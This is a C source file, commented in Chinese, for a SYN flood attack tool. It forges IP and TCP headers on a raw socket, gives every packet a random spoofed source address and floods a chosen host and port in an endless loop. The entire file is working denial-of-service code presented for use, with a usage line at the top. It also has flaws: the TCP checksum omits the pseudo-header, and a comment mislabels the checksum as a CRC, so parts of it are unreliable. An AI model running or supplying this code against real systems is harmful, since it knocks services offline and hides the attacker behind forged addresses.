//syn攻击
//用法 ./syn hostname destport sourport
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <signal.h>
#include <netinet/tcp.h>
//攻击函数
void attack(int skfd,struct sockaddr_in *target,unsigned short srcport);
//校验和
unsigned short checksum(unsigned char *addr,int len);
 
//退出信号处理函数
void signal_exit(int sig)
{
    printf("终止syn攻击\n");
    exit(1);
}
int main(int argc,char** argv)
{
    int skfd,port;
    struct sockaddr_in target;
    struct hostent *host;
    const int on=1;
    unsigned short srcport;
    bzero(&target,sizeof(struct sockaddr_in));
    target.sin_family=AF_INET;
    port=atoi(argv[2]);
    if (port<0)
    {
        perror("port error");
        exit(1);
    }
    target.sin_port=htons(port);
    
    if(inet_aton(argv[1],&target.sin_addr)==0)
    {
        host=gethostbyname(argv[1]);
        if(host==NULL)
        {
            printf("TargetName Error:%s\n",hstrerror(h_errno));
            exit(1);
        }
        target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
        
    }
    //将协议字段置为IPPROTO_TCP，来创建一个TCP的原始套接字
    if(0>(skfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))){
        perror("Create Error");
        exit(1);
    }
    
    //开启IP_HDRINCL特性，我们自己手动构造IP报文
    if(0>setsockopt(skfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))){
        perror("IP_HDRINCL failed");
        exit(1);
    }
    
    //只有root用户才可以使用原始套接字
    //setuid(getpid());
    
    //源端口
    srcport = atoi(argv[3]);
   // printf("%s\n",argv[3]);
    
    signal(SIGINT, signal_exit);
    attack(skfd,&target,srcport);
}
 
//在该函数中构造整个IP报文，最后调用sendto函数将报文发送出去
void attack(int skfd,struct sockaddr_in *target,unsigned short srcport)
{
    char buf[128]={0};
    struct ip *ip;
    struct tcphdr *tcp;
    int ip_len;
    //在我们TCP的报文中Data没有字段，所以整个IP报文的长度
    ip_len = sizeof(struct ip)+sizeof(struct tcphdr);
    //开始填充IP首部
    ip=(struct ip*)buf;
    //IP的版本
    ip->ip_v = IPVERSION;
    //IP都不长度，字节数
    ip->ip_hl = sizeof(struct ip)>>2;
    //服务类型
    ip->ip_tos = 0;
    //ip报文总长度
    ip->ip_len = htons(ip_len);
    //标志
    ip->ip_id=0;
    //段的偏移地址
    ip->ip_off=0;
    //最大的生存时间
    ip->ip_ttl=MAXTTL;
    //协议类型
    ip->ip_p=IPPROTO_TCP;
    
    //校验和，先填0
    ip->ip_sum=0;
    //发送的目标地址
    ip->ip_dst=target->sin_addr;
    
    //开始填充TCP首部
    tcp = (struct tcphdr*)(buf+sizeof(struct ip));
    tcp->source  = htons(srcport);
    tcp->dest = target->sin_port;
    tcp->seq = random();
    tcp->doff = 5;
    tcp->syn=1;
    tcp->check= 0;
    tcp->window=65535;
    while(1)
    {
        //源地址伪造
        ip->ip_src.s_addr =random();
        tcp->check=checksum((unsigned char*)tcp,sizeof(struct tcphdr)); //校验和
        sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
    }
}
 
//关于CRC校验和的计算
unsigned short checksum(unsigned char *buf,int len)
{
    unsigned int sum=0;
    unsigned short *cbuf;
    
    cbuf=(unsigned short *)buf;
    
    while(len>1)
    {
        sum+=*cbuf++;
        len-=2; //剩余尚未累加的16比特的个数
    }
    
    if(len) //若len的长度不是偶数
        sum+=*(unsigned char *)cbuf; //用最后一个字节补齐
    
    //防溢出处理
    sum=(sum>>16)+(sum & 0xffff);
    sum+=(sum>>16);
    return ~sum;
}
